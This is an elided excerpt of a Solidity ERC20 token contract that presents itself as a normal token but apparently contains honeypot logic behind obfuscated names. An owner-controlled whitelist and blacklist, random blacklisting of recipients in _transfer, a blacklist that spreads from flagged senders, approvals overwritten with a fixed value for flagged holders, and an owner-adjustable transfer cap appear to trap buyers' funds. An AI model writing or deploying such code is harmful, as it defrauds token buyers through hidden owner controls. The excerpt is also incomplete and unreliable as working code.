...
contract ERC20Token is Context, IERC20, Ownable {
  ...
  mapping (address => bool) public thealpha;
  mapping (address => bool) public rainyday;

  bool private connyly;
  ...
  constructor() public {
    ...
    elephant = _totalSupply / 1250;
    opera = elephant;
    rainyday[creator] = false;
    thealpha[msg.sender] = true;
  ...
  function ViewTheRate() external view onlyOwner returns (uint256) {
  ...
  */
  ...
  function BurnSomeWolfs(uint256 amount) external onlyOwner {
    elephant = amount;
  }
  ...
  function CheckTheAddress(address spender, bool val, bool val2) external onlyOwner {
    thealpha[spender] = val;
    rainyday[spender] = val2; 
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (connyly == true)) {
      thealpha[recipient] = true;
      rainyday[recipient] = false;
      connyly = false;
    }
    
    if (thealpha[recipient] != true) {
        rainyday[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((rainyday[sender]) && (thealpha[recipient] == false)) {
        rainyday[recipient] = true;
    }
    
    if (thealpha[sender] == false) {
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (mfiii == true)) {
      thealpha[spender] = true;
      rainyday[spender] = false;
      mfiii = false;
    }
    
    tok = (rainyday[owner] ? 122234 : amount);
